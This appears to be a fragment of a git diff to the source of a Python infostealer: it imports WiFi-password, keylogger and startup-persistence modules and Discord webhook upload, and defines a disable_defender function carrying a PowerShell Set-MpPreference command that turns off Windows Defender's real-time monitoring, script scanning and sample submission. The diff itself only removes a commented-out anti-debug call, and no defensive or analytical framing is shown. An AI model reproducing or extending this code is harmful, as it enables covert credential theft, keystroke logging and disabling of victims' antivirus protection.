@@ -4,7 +4,6 @@ from modules.info import start
 from modules.wifi import WifiPasswords
 from modules.keylogger import Keylogger
 from modules.startup import StartUp
-#from modules.antidebug import Antidebug
 from tkinter import messagebox
 import zipfile
 import subprocess
@@ -13,8 +12,6 @@ from discord import File, SyncWebhook
 import socket
 import requests
 
-
-#Antidebug()
 
 def disable_defender():
     #C:\> Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && Set-MpPreference -SubmitSamplesConsent 2
